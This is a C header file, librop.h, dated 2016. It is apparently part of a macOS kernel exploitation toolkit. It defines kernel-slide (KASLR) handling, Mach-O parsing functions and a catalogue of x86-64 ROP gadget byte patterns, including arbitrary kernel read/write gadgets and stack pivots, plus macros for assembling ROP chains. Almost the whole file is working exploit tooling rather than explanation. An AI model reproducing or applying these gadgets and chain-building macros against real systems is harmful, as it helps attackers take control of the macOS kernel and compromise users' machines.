/*
*   librop.h
*   librop
*
*   Created by jndok on 15/01/16.
*   Copyright © 2016 jndok. All rights reserved.
*/

#ifndef librop_h
#define librop_h

#pragma mark DEFS

#define KERNEL_PATH_ON_DISK  "/System/Library/Kernels/kernel"

#define KERNEL_BASE 0xFFFFFF8000200000

#define KSLIDE_UNKNOWN  -1
#define SLIDE_POINTER(pointer)                          ((pointer) + gKERNEL_SLIDE)
#define UNSLIDE_POINTER(pointer)                        ((pointer) - gKERNEL_SLIDE)

#define FIND_AND_SET_KERNEL_SLIDE()                     SET_KERNEL_SLIDE(obtain_kernel_slide())
#define SET_KERNEL_SLIDE(kslide)                        gKERNEL_SLIDE = kslide;

#define RESOLVE_SYMBOL_IN_KERNEL(kmap, symbol_name)     (gKERNEL_SLIDE != KSLIDE_UNKNOWN) ? (SLIDE_POINTER(find_symbol_address(kmap, symbol_name))) : KSLIDE_UNKNOWN
#define RESOLVE_GADGET_IN_KERNEL(kmap, gadget, size)    ((gKERNEL_SLIDE != KSLIDE_UNKNOWN) && (find_gadget_address(kmap, gadget, size) != NULL)) ? (SLIDE_POINTER(((uint64_t)find_gadget_address(kmap, gadget, size) - (uint64_t)kmap->base) + KERNEL_BASE)) : KSLIDE_UNKNOWN

#define PUSH_GADGET(rop_chain) rop_chain->chain[rop_chain->counter++]

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <fcntl.h>

#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>

#include <mach-o/loader.h>
#include <mach-o/nlist.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>

extern uint64_t gKERNEL_SLIDE;

typedef const char  gadget_t;
typedef uint32_t    gadget_size_t;

typedef struct macho_map {
    void        *base;
    uint32_t    size;
} macho_map_t;

typedef struct rop_chain {
    uint64_t counter;
    uint64_t padding[0x4999];
    uint64_t chain[0x4000];
} rop_chain_t;

#pragma mark ANALYSIS

macho_map_t *map_file_with_path(const char *path);

#pragma mark EXPLOITATION
__attribute__((always_inline)) int64_t obtain_kernel_slide(void);
int64_t find_symbol_address(macho_map_t *map, const char *symbol_name);

__attribute__((always_inline)) void *find_gadget_address(macho_map_t *map, gadget_t *gadget, gadget_size_t gadget_size);

#pragma mark PARSING

__attribute__((always_inline)) struct mach_header_64        *macho_parsing_find_mach_header(macho_map_t *map);
__attribute__((always_inline)) struct load_command          *macho_parsing_find_load_command(macho_map_t *map, uint32_t cmd);
__attribute__((always_inline)) struct segment_command_64    *macho_parsing_find_segment_command(macho_map_t *map, const char *seg_name);
__attribute__((always_inline)) struct section_64            *macho_parsing_find_section_command(macho_map_t *map, const char *seg_name, const char *sect_name);

#pragma mark GADGETS

/* registers gadgets */

#define ROP_POP_RAX(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x58, 0xC3}), 2)
#define ROP_POP_RBX(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5B, 0xC3}), 2)
#define ROP_POP_RCX(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x59, 0xC3}), 2)
#define ROP_POP_RDX(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5A, 0xC3}), 2)
#define ROP_POP_RSP(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5C, 0xC3}), 2)
#define ROP_POP_RBP(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5D, 0xC3}), 2)
#define ROP_POP_RSI(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5E, 0xC3}), 2)
#define ROP_POP_RDI(map)                             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5F, 0xC3}), 2)
#define ROP_POP_RSP_RBP(map)                         RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x5C, 0x5D, 0xC3}), 3)
#define ROP_RSI_TO_RAX(map)                          RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x55, 0x48, 0x89, 0xE5, 0x48, 0x89, 0xF0, 0x5D, 0xC3}), 9)
#define ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map)          RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x89, 0xC7, 0x5D, 0xFF, 0xE1}), 6)

/* read/write gadgets */

#define ROP_READ_RAX_TO_RAX_POP_RBP(map)             RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x8B, 0x00, 0x5D, 0xC3}), 5)
#define ROP_WRITE_RDX_WHAT_RCX_WHERE_POP_RBP(map)    RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x89, 0x11, 0x5D, 0xC3}), 5)
#define ROP_WRITE_RAX_WHAT_RDX_WHERE_POP_RBP(map)    RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x89, 0x02, 0x5D, 0xC3}), 5)

/* utility gadgets */

#define ROP_NOP(map)                                 RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x90, 0xC3}), 2)

#define ROP_ARG1(chain, map, value) ROP_POP_RDI(map); PUSH_GADGET(chain) = value;
#define ROP_ARG2(chain, map, value) ROP_POP_RSI(map); PUSH_GADGET(chain) = value;
#define ROP_ARG3(chain, map, value) ROP_POP_RDX(map); PUSH_GADGET(chain) = value;
#define ROP_ARG4(chain, map, value) ROP_POP_RCX(map); PUSH_GADGET(chain) = value;

#define ROP_RAX_TO_ARG1(map, chain)    ROP_POP_RCX(map); PUSH_GADGET(chain) = ROP_NOP(map); PUSH_GADGET(chain) = ROP_RAX_TO_RDI_POP_RBP_JMP_RCX(map); PUSH_GADGET(chain) = 0xdeadbeefdeadbeef;

/* stack pivoting gadgets */

#define ROP_PIVOT_RAX(map)                           RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)
#define ROP_POP_R14_R15_RBP(map)                     RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e, 0x41, 0x5F, 0x5D, 0xC3}), 13)
#define ROP_R14_TO_RCX_CALL_pRAX(map)                RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x4C,0x89,0xF1,0xFF, 0x10}), 5)
#define ROP_R14_TO_RDI_CALL_pRAX(map)                RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x4C, 0x89, 0xF7, 0xFF, 0x10}), 5)
#define ROP_AND_RCX_RAX_POP_RBP(map)                 RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x21, 0xC8, 0x5D, 0xC3}), 5)
#define ROP_OR_RCX_RAX_POP_RBP(map)                  RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x48, 0x09, 0xC8, 0x5D, 0xC3}), 5)
#define ROP_XCHG_ESP_EAX(map)                        RESOLVE_GADGET_IN_KERNEL(map, (char*)((uint8_t[]){0x94, 0xc3}), 2)

#endif /* librop_h */
